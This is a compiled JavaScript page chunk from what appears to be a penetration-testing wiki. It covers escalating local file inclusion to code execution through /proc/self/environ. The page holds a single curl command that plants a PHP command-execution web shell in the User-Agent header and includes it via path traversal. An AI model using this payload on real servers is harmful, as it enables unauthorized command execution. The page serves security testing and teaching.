import{_ as a,c as e,a5 as i,o as t}from"./chunks/framework.B5CpDqM0.js";const u=JSON.parse('{"title":"/proc","description":"","frontmatter":{"authors":"ShutdownRepo"},"headers":[],"relativePath":"web/inputs/file-inclusion/lfi-to-rce/proc.md","filePath":"web/inputs/file-inclusion/lfi-to-rce/proc.md","lastUpdated":1724982529000}'),n={name:"web/inputs/file-inclusion/lfi-to-rce/proc.md"};function l(r,s,p,o,c,d){return t(),e("div",null,s[0]||(s[0]=[i(`<h1 id="proc" tabindex="-1">/proc <a class="header-anchor" href="#proc" aria-label="Permalink to &quot;/proc&quot;">‚Äã</a></h1><details class="details custom-block"><summary>/proc/self/environ</summary><p>Testers can abuse a process created due to a request. The payload is injected in the <code>User-Agent</code> header.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Sending a request to $URL with a malicious user-agent</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Accessing the payload via LFI</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --user-agent</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;&lt;?php passthru(</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$_GET</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">[&#39;cmd&#39;]); ?&gt;&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $URL</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/?parameter=../../../proc/self/environ</span></span></code></pre></div></details><details class="details custom-block"><summary>üõ†Ô∏è /proc/*/fd</summary></details>`,3)]))}const k=a(n,[["render",l]]);export{u as __pageData,k as default};
